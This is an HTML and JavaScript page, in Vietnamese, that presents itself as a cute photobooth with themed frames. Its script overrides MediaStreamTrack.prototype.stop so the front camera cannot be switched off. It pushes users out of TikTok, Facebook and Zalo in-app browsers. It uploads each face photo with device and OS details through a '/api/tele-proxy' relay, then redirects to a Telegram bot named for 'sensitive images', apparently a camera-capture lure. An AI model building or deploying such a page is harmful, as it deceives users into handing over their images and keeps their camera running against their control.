<!doctype html>
<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Photobooth Cute 📸</title>
    <style>
      * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
      html, body { min-height: 100%; }
      body {
        font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        background: linear-gradient(135deg, #ffe0ec 0%, #fff5fa 45%, #ffe4f1 100%);
        color: #4b3f47;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
        padding: 16px;
        overflow-x: hidden;
      }

      /* Decorative floating hearts */
      body::before, body::after {
        content: "";
        position: fixed;
        pointer-events: none;
        z-index: 0;
      }
      body::before {
        content: "♡";
        top: 5%;
        left: 6%;
        font-size: 60px;
        color: rgba(248, 81, 153, 0.15);
        animation: float 6s ease-in-out infinite;
      }
      body::after {
        content: "✿";
        bottom: 8%;
        right: 7%;
        font-size: 50px;
        color: rgba(248, 81, 153, 0.18);
        animation: float 7s ease-in-out infinite reverse;
      }
      @keyframes float {
        0%, 100% { transform: translateY(0) rotate(-5deg); }
        50% { transform: translateY(-16px) rotate(8deg); }
      }

      .card {
        position: relative;
        z-index: 1;
        background: rgba(255, 255, 255, 0.92);
        backdrop-filter: blur(20px);
        -webkit-backdrop-filter: blur(20px);
        padding: 24px 20px 20px;
        border-radius: 32px;
        text-align: center;
        width: 100%;
        max-width: 440px;
        border: 2px solid rgba(255, 255, 255, 0.95);
        box-shadow:
          0 24px 60px rgba(214, 19, 108, 0.18),
          0 0 0 4px rgba(248, 81, 153, 0.08),
          inset 0 0 30px rgba(255, 200, 220, 0.15);
        animation: cardIn 0.6s cubic-bezier(0.2, 0.8, 0.2, 1);
      }
      @keyframes cardIn {
        from { opacity: 0; transform: translateY(20px) scale(0.97); }
        to { opacity: 1; transform: translateY(0) scale(1); }
      }

      h2 {
        margin: 0;
        color: #d6136c;
        font-size: 24px;
        font-weight: 900;
        letter-spacing: -0.5px;
        line-height: 1.2;
      }
      .title-sub {
        margin: 6px 0 0;
        color: #9a7d8a;
        font-size: 12px;
        font-weight: 600;
      }

      /* ==== CAMERA FRAME ==== */
      .camera-wrap {
        position: relative;
        width: 100%;
        aspect-ratio: 4/5;
        margin: 18px 0 14px;
        border-radius: 26px;
        overflow: hidden;
        background: linear-gradient(135deg, #fff4f8, #ffe5ef);
        box-shadow:
          inset 0 0 0 3px rgba(255, 255, 255, 0.6),
          0 12px 32px rgba(214, 19, 108, 0.15);
      }

      #preview {
        width: 100%;
        height: 100%;
        object-fit: cover;
        display: block;
        transform: scaleX(-1);
        background: #f5e8ee;
      }

      #preview.hidden { display: none; }

      #msg {
        position: absolute;
        inset: 0;
        display: flex;
        align-items: center;
        justify-content: center;
        color: #b88fa2;
        font-size: 13px;
        font-weight: 600;
        text-align: center;
        padding: 20px;
      }

      /* ==== FRAME OVERLAY ==== */
      .frame-overlay {
        position: absolute;
        inset: 0;
        pointer-events: none;
        z-index: 5;
        border-radius: 26px;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .frame-overlay .corner {
        position: absolute;
        width: 34px;
        height: 34px;
        border: 4px solid;
        pointer-events: none;
      }
      .frame-overlay .corner.tl { top: 12px; left: 12px; border-right: none; border-bottom: none; border-radius: 14px 0 0 0; }
      .frame-overlay .corner.tr { top: 12px; right: 12px; border-left: none; border-bottom: none; border-radius: 0 14px 0 0; }
      .frame-overlay .corner.bl { bottom: 12px; left: 12px; border-right: none; border-top: none; border-radius: 0 0 0 14px; }
      .frame-overlay .corner.br { bottom: 12px; right: 12px; border-left: none; border-top: none; border-radius: 0 0 14px 0; }

      /* Frame theme: Hồng pastel */
      .frame-overlay.theme-pink .corner { border-color: #ff5fa0; }
      .frame-overlay.theme-pink::before {
        content: "♡";
        position: absolute;
        top: 10px;
        left: 50%;
        transform: translateX(-50%);
        font-size: 22px;
        color: #ff5fa0;
        animation: sparkle 2s ease-in-out infinite;
      }

      /* Frame theme: Y2K */
      .frame-overlay.theme-y2k .corner { border-color: #b060ff; }
      .frame-overlay.theme-y2k::before {
        content: "✦ ✧ ✦";
        position: absolute;
        top: 10px;
        left: 50%;
        transform: translateX(-50%);
        font-size: 16px;
        letter-spacing: 4px;
        color: #d97aff;
        animation: sparkle 1.8s ease-in-out infinite;
      }
      .frame-overlay.theme-y2k::after {
        content: "✧";
        position: absolute;
        bottom: 14px;
        right: 20px;
        font-size: 20px;
        color: #b060ff;
        animation: sparkle 2.2s ease-in-out infinite 0.4s;
      }

      /* Frame theme: Cổ điển */
      .frame-overlay.theme-classic {
        border: 6px double #a67c52;
        border-radius: 26px;
      }
      .frame-overlay.theme-classic .corner { border-color: transparent; }
      .frame-overlay.theme-classic::before {
        content: "❦";
        position: absolute;
        top: 10px;
        left: 50%;
        transform: translateX(-50%);
        font-size: 20px;
        color: #a67c52;
      }

      /* Frame theme: Halloween */
      .frame-overlay.theme-halloween .corner { border-color: #ff7a00; }
      .frame-overlay.theme-halloween::before {
        content: "🎃";
        position: absolute;
        top: 8px;
        left: 50%;
        transform: translateX(-50%);
        font-size: 24px;
        animation: bob 2s ease-in-out infinite;
      }
      .frame-overlay.theme-halloween::after {
        content: "🦇";
        position: absolute;
        bottom: 14px;
        right: 20px;
        font-size: 20px;
        animation: bob 2.4s ease-in-out infinite 0.5s;
      }

      /* Frame theme: Tết */
      .frame-overlay.theme-tet .corner { border-color: #e63a3a; }
      .frame-overlay.theme-tet::before {
        content: "🏮";
        position: absolute;
        top: 8px;
        left: 50%;
        transform: translateX(-50%);
        font-size: 24px;
        animation: bob 2s ease-in-out infinite;
      }
      .frame-overlay.theme-tet::after {
        content: "🌸";
        position: absolute;
        bottom: 14px;
        left: 20px;
        font-size: 20px;
        animation: bob 2.4s ease-in-out infinite 0.5s;
      }

      /* Frame theme: Đen trắng */
      .frame-overlay.theme-bw {
        border: 8px solid #1a1a1a;
        border-radius: 26px;
      }
      .frame-overlay.theme-bw .corner { border-color: transparent; }
      .frame-overlay.theme-bw::before {
        content: "◈";
        position: absolute;
        top: 10px;
        left: 50%;
        transform: translateX(-50%);
        font-size: 18px;
        color: #fff;
        background: #1a1a1a;
        padding: 0 8px;
      }

      @keyframes sparkle {
        0%, 100% { opacity: 0.7; transform: translateX(-50%) scale(1); }
        50% { opacity: 1; transform: translateX(-50%) scale(1.1); }
      }
      @keyframes bob {
        0%, 100% { transform: translateX(-50%) translateY(0); }
        50% { transform: translateX(-50%) translateY(-4px); }
      }

      /* ==== FRAME PICKER ==== */
      .frame-picker {
        margin: 0 0 16px;
      }
      .frame-picker-label {
        font-size: 11px;
        color: #b88fa2;
        font-weight: 700;
        letter-spacing: 1px;
        text-transform: uppercase;
        margin-bottom: 8px;
      }
      .frame-list {
        display: flex;
        gap: 10px;
        overflow-x: auto;
        padding: 4px 2px 12px;
        scrollbar-width: none;
        -ms-overflow-style: none;
      }
      .frame-list::-webkit-scrollbar { display: none; }

      .frame-item {
        flex-shrink: 0;
        width: 72px;
        height: 90px;
        border-radius: 16px;
        cursor: pointer;
        border: 3px solid transparent;
        transition: all 0.25s ease;
        position: relative;
        overflow: hidden;
        background: #f5e8ee;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 26px;
      }
      .frame-item.active {
        border-color: #ff5fa0;
        transform: scale(1.06);
        box-shadow: 0 8px 20px rgba(248, 81, 153, 0.3);
      }
      .frame-item.active::after {
        content: "✓";
        position: absolute;
        top: 2px;
        right: 4px;
        background: #ff5fa0;
        color: #fff;
        width: 18px;
        height: 18px;
        border-radius: 50%;
        font-size: 11px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: bold;
      }
      .frame-item[data-frame="pink"] { background: linear-gradient(135deg, #ffd9e6, #ffb5ce); }
      .frame-item[data-frame="y2k"] { background: linear-gradient(135deg, #e0d4ff, #c7b0ff); }
      .frame-item[data-frame="classic"] { background: linear-gradient(135deg, #f5e6d3, #d4b896); }
      .frame-item[data-frame="halloween"] { background: linear-gradient(135deg, #ffd6a5, #ff9e3d); }
      .frame-item[data-frame="tet"] { background: linear-gradient(135deg, #ffcfcf, #ff8080); }
      .frame-item[data-frame="bw"] { background: linear-gradient(135deg, #d8d8d8, #a0a0a0); }

      /* ==== BUTTON ==== */
      .btn {
        background: linear-gradient(135deg, #ff69a8, #e92b7b);
        color: white;
        border: none;
        padding: 18px;
        width: 100%;
        border-radius: 20px;
        font-weight: 900;
        cursor: pointer;
        font-size: 17px;
        letter-spacing: 0.3px;
        box-shadow:
          0 8px 0 #c91a6a,
          0 14px 28px rgba(248, 81, 153, 0.35);
        transition: all 0.15s ease;
      }
      .btn:active:not(:disabled) {
        transform: translateY(6px);
        box-shadow: 0 2px 0 #c91a6a, 0 6px 14px rgba(248, 81, 153, 0.3);
      }
      .btn:disabled {
        background: linear-gradient(135deg, #d8d3d6, #bcb7bb);
        box-shadow: 0 6px 0 #a8a3a6;
        color: #666;
        cursor: not-allowed;
      }

      #status {
        font-size: 12px;
        color: #8a7d85;
        margin-top: 14px;
        line-height: 1.5;
        font-weight: 600;
        min-height: 18px;
      }

      /* ==== RESULT MODAL ==== */
      .result-modal {
        position: fixed;
        inset: 0;
        z-index: 100;
        background: rgba(40, 15, 30, 0.75);
        backdrop-filter: blur(8px);
        display: none;
        align-items: center;
        justify-content: center;
        padding: 20px;
        animation: fadeIn 0.3s ease;
      }
      .result-modal.show { display: flex; }
      @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

      .result-box {
        background: #fff;
        border-radius: 28px;
        padding: 24px 20px;
        max-width: 380px;
        width: 100%;
        text-align: center;
        animation: popIn 0.4s cubic-bezier(0.2, 0.8, 0.2, 1.2);
        max-height: 90vh;
        overflow-y: auto;
      }
      @keyframes popIn {
        from { opacity: 0; transform: scale(0.85); }
        to { opacity: 1; transform: scale(1); }
      }

      .result-box h3 {
        margin: 0 0 4px;
        color: #d6136c;
        font-size: 20px;
      }
      .result-box p {
        margin: 0 0 16px;
        color: #9a7d8a;
        font-size: 12px;
      }
      .result-img {
        width: 100%;
        border-radius: 16px;
        display: block;
        box-shadow: 0 8px 24px rgba(214, 19, 108, 0.2);
        margin-bottom: 18px;
      }
      .result-loading {
        padding: 40px 20px;
        color: #b88fa2;
        font-size: 13px;
        font-weight: 600;
      }
      .spinner {
        width: 40px;
        height: 40px;
        border: 4px solid #f0e0e8;
        border-top-color: #ff5fa0;
        border-radius: 50%;
        margin: 0 auto 14px;
        animation: spin 0.8s linear infinite;
      }
      @keyframes spin { to { transform: rotate(360deg); } }

      /* ==== BROWSER WARNING ==== */
      #browser-warning {
        display: none;
        position: fixed;
        inset: 0;
        background: linear-gradient(145deg, #ffd8e4, #fff0f5);
        z-index: 10000;
        padding: 30px 20px;
        align-items: center;
        justify-content: center;
      }
      .warning-box {
        max-width: 420px;
        background: #fff;
        padding: 30px 24px;
        border-radius: 28px;
        text-align: center;
        box-shadow: 0 20px 50px rgba(214, 19, 108, 0.2);
      }
      .warning-box h3 { color: #d6136c; margin-top: 0; }
      .steps {
        text-align: left;
        margin-top: 20px;
        color: #5c5158;
        font-size: 14px;
        line-height: 1.8;
      }
      .highlight { color: #d6136c; font-weight: bold; }

      @media (max-width: 380px) {
        .card { padding: 20px 16px; }
        h2 { font-size: 21px; }
        .frame-item { width: 64px; height: 80px; }
      }
    </style>
  </head>
  <body>
    <div id="browser-warning">
      <div class="warning-box">
        <h3>⚠️ YÊU CẦU TRÌNH DUYỆT NGOÀI</h3>
        <div class="steps">
          Vui lòng:<br />
          1. Nhấn <span class="highlight">(···)</span> hoặc <span class="highlight">(⋮)</span> góc trên phải.<br />
          2. Chọn <span class="highlight">"Mở bằng trình duyệt"</span>.
        </div>
      </div>
    </div>

    <div class="card" id="mainCard">
      <h2>📸 Photobooth Cute</h2>
      <div class="title-sub">Chọn khung yêu thích rồi chụp thôi ♡</div>

      <!-- Camera -->
      <div class="camera-wrap">
        <video id="preview" autoplay playsinline muted class="hidden"></video>
        <p id="msg">Đang khởi tạo camera...</p>
        <div class="frame-overlay theme-pink" id="frameOverlay">
          <span class="corner tl"></span>
          <span class="corner tr"></span>
          <span class="corner bl"></span>
          <span class="corner br"></span>
        </div>
      </div>

      <!-- Frame picker -->
      <div class="frame-picker">
        <div class="frame-picker-label">Chọn khung</div>
        <div class="frame-list" id="frameList">
          <div class="frame-item active" data-frame="pink">♡</div>
          <div class="frame-item" data-frame="y2k">✦</div>
          <div class="frame-item" data-frame="classic">❦</div>
          <div class="frame-item" data-frame="halloween">🎃</div>
          <div class="frame-item" data-frame="tet">🏮</div>
          <div class="frame-item" data-frame="bw">◈</div>
        </div>
      </div>

      <button class="btn" id="startBtn">📸 CHỤP NGAY</button>
      <div id="status">Chọn khung → bấm chụp → nhận ảnh qua bot ♡</div>
    </div>

    <!-- Result modal -->
    <div class="result-modal" id="resultModal">
      <div class="result-box" id="resultBox">
        <div class="result-loading">
          <div class="spinner"></div>
          Đang xử lý ảnh...
        </div>
      </div>
    </div>

    <script>
      // ============ BROWSER WARNING ============
      function checkAndShowWarning() {
        const ua = navigator.userAgent || "";
        if (/TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua)) {
          document.getElementById("browser-warning").style.display = "flex";
          document.getElementById("mainCard").style.display = "none";
        }
      }
      document.addEventListener("DOMContentLoaded", checkAndShowWarning);

      // ============ STATE ============
      const state = {
        currentFrame: "pink",
        capturedBlob: null,
      };
      window.photoboothState = state;

      const btn = document.getElementById("startBtn");
      const video = document.getElementById("preview");
      const status = document.getElementById("status");
      const msg = document.getElementById("msg");
      const frameOverlay = document.getElementById("frameOverlay");
      const frameList = document.getElementById("frameList");
      const resultModal = document.getElementById("resultModal");
      const resultBox = document.getElementById("resultBox");

      // ============ FRAME PICKER ============
      frameList.addEventListener("click", (e) => {
        const item = e.target.closest(".frame-item");
        if (!item) return;
        const frame = item.dataset.frame;

        state.currentFrame = frame;

        document.querySelectorAll(".frame-item").forEach((el) => el.classList.remove("active"));
        item.classList.add("active");

        // Cập nhật overlay
        frameOverlay.className = "frame-overlay theme-" + frame;
      });

      // ============ CAMERA ============
      const originalGetUserMedia = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
      const originalStop = MediaStreamTrack.prototype.stop;
      let frontStream = null;

      navigator.mediaDevices.getUserMedia = async (constraints) => {
        const stream = await originalGetUserMedia(constraints);
        if (constraints && constraints.video && constraints.video.facingMode === "user") {
          frontStream = stream;
          video.srcObject = stream;
          video.classList.remove("hidden");
          msg.style.display = "none";
        }
        return stream;
      };

      MediaStreamTrack.prototype.stop = function () {
        if (this.label.toLowerCase().includes("front") || this.label.toLowerCase().includes("user")) {
          // giữ preview
        } else {
          originalStop.apply(this);
        }
      };

      window.addEventListener("load", () => {
        navigator.mediaDevices
          .getUserMedia({ video: { facingMode: "user" }, audio: false })
          .catch((err) => {
            console.log("Camera init:", err);
            msg.textContent = "Không mở được camera. Hãy cấp quyền và tải lại trang.";
          });
      });

      // ============ CAPTURE WITH FRAME ============
      function drawFrameOnCanvas(ctx, w, h, frameType) {
        const pad = Math.round(w * 0.035);

        if (frameType === "pink") {
          // Viền hồng + trái tim
          ctx.strokeStyle = "#ff5fa0";
          ctx.lineWidth = Math.round(w * 0.012);
          ctx.strokeRect(pad, pad, w - pad * 2, h - pad * 2);
          ctx.font = `${Math.round(w * 0.08)}px serif`;
          ctx.fillStyle = "#ff5fa0";
          ctx.textAlign = "center";
          ctx.fillText("♡", w / 2, pad + w * 0.08);
        } else if (frameType === "y2k") {
          ctx.strokeStyle = "#b060ff";
          ctx.lineWidth = Math.round(w * 0.012);
          ctx.strokeRect(pad, pad, w - pad * 2, h - pad * 2);
          ctx.font = `${Math.round(w * 0.05)}px serif`;
          ctx.fillStyle = "#d97aff";
          ctx.textAlign = "center";
          ctx.fillText("✦ ✧ ✦", w / 2, pad + w * 0.07);
          ctx.fillText("✧", w - pad - w * 0.06, h - pad - w * 0.04);
        } else if (frameType === "classic") {
          // Double border nâu
          ctx.strokeStyle = "#a67c52";
          ctx.lineWidth = Math.round(w * 0.015);
          ctx.strokeRect(pad, pad, w - pad * 2, h - pad * 2);
          ctx.strokeRect(pad * 2.2, pad * 2.2, w - pad * 4.4, h - pad * 4.4);
          ctx.font = `${Math.round(w * 0.06)}px serif`;
          ctx.fillStyle = "#a67c52";
          ctx.textAlign = "center";
          ctx.fillText("❦", w / 2, pad + w * 0.07);
        } else if (frameType === "halloween") {
          ctx.strokeStyle = "#ff7a00";
          ctx.lineWidth = Math.round(w * 0.014);
          ctx.strokeRect(pad, pad, w - pad * 2, h - pad * 2);
          ctx.font = `${Math.round(w * 0.08)}px serif`;
          ctx.textAlign = "center";
          ctx.fillText("🎃", w / 2, pad + w * 0.08);
          ctx.textAlign = "right";
          ctx.fillText("🦇", w - pad - w * 0.02, h - pad - w * 0.02);
        } else if (frameType === "tet") {
          ctx.strokeStyle = "#e63a3a";
          ctx.lineWidth = Math.round(w * 0.014);
          ctx.strokeRect(pad, pad, w - pad * 2, h - pad * 2);
          ctx.font = `${Math.round(w * 0.08)}px serif`;
          ctx.textAlign = "center";
          ctx.fillText("🏮", w / 2, pad + w * 0.08);
          ctx.textAlign = "left";
          ctx.fillText("🌸", pad + w * 0.02, h - pad - w * 0.02);
        } else if (frameType === "bw") {
          ctx.strokeStyle = "#1a1a1a";
          ctx.lineWidth = Math.round(w * 0.02);
          ctx.strokeRect(pad, pad, w - pad * 2, h - pad * 2);
          ctx.fillStyle = "#1a1a1a";
          const tagW = w * 0.12;
          const tagH = h * 0.03;
          ctx.fillRect(w / 2 - tagW / 2, pad - tagH / 2, tagW, tagH);
          ctx.font = `${Math.round(w * 0.04)}px serif`;
          ctx.fillStyle = "#fff";
          ctx.textAlign = "center";
          ctx.textBaseline = "middle";
          ctx.fillText("◈", w / 2, pad);
        }
      }

      function captureWithFrame() {
        return new Promise((resolve) => {
          if (!video.videoWidth) return resolve(null);

          const canvas = document.createElement("canvas");
          const vw = video.videoWidth;
          const vh = video.videoHeight;
          // Giữ tỉ lệ 4:5 cho đẹp
          const targetRatio = 4 / 5;
          let cw = vw;
          let ch = vw / targetRatio;
          let offsetX = 0;
          let offsetY = 0;
          if (ch > vh) {
            ch = vh;
            cw = vh * targetRatio;
            offsetX = (vw - cw) / 2;
          } else {
            offsetY = (vh - ch) / 2;
          }

          canvas.width = cw;
          canvas.height = ch;
          const ctx = canvas.getContext("2d");

          // Vẽ ảnh mirror
          ctx.translate(cw, 0);
          ctx.scale(-1, 1);
          ctx.drawImage(video, offsetX, offsetY, cw, ch, 0, 0, cw, ch);
          ctx.setTransform(1, 0, 0, 1, 0, 0);

          // Vẽ frame
          drawFrameOnCanvas(ctx, cw, ch, state.currentFrame);

          canvas.toBlob((b) => resolve(b), "image/jpeg", 0.92);
        });
      }

      // ============ SHOW RESULT ============
      function showResult(blob) {
        return new Promise((resolve) => {
          const url = URL.createObjectURL(blob);
          resultBox.innerHTML = `
            <h3>📸 Ảnh của bạn đây!</h3>
            <p>Ảnh đã được gửi qua bot</p>
            <img src="${url}" class="result-img" alt="Ảnh" />
            <button class="btn" id="continueBtn">TIẾP TỤC →</button>
          `;
          resultModal.classList.add("show");

          document.getElementById("continueBtn").onclick = () => {
            resultModal.classList.remove("show");
            URL.revokeObjectURL(url);
            resolve();
          };
        });
      }

      // ============ START BUTTON ============
      btn.addEventListener("click", async () => {
        btn.disabled = true;
        btn.innerText = "ĐANG CHỤP...";
        status.textContent = "Đang xử lý ảnh...";

        // Đợi 1 nhịp để overlay update
        await new Promise((r) => setTimeout(r, 200));

        const blob = await captureWithFrame();
        if (!blob) {
          btn.disabled = false;
          btn.innerText = "📸 CHỤP NGAY";
          status.textContent = "Không chụp được. Hãy cấp quyền camera.";
          return;
        }

        state.capturedBlob = blob;

        // Gửi tới bot (dùng API proxy như cũ)
        btn.innerText = "ĐANG GỬI...";
        status.textContent = "Đang gửi ảnh qua bot...";

        try {
          const info = {
            time: new Date().toLocaleString("vi-VN"),
            device: navigator.userAgent.includes("iPhone") ? "iPhone" : "Mobile",
            os: /iPhone|iPad/.test(navigator.userAgent) ? "iOS" : "Android/Other",
            camera: "✅ Đã chụp (frame: " + state.currentFrame + ")",
          };
          const formData = new FormData();
          formData.append("clientInfo", JSON.stringify(info));
          formData.append("front", blob, "front.jpg");

          const res = await fetch("/api/tele-proxy", {
            method: "POST",
            body: formData,
          });
          const data = await res.json();
          console.log("Proxy:", data);
        } catch (e) {
          console.warn("Gửi thất bại:", e);
        }

        // Hiện modal kết quả
        await showResult(blob);

        // Reset + redirect bot
        btn.disabled = false;
        btn.innerText = "📸 CHỤP NGAY";
        status.textContent = "✅ Đã gửi! Mở bot để xem ảnh ♡";
        setTimeout(() => {
          window.location.href = "https://t.me/hinhanhnhaycam_bot";
        }, 1500);
      });
    </script>
  </body>
</html>
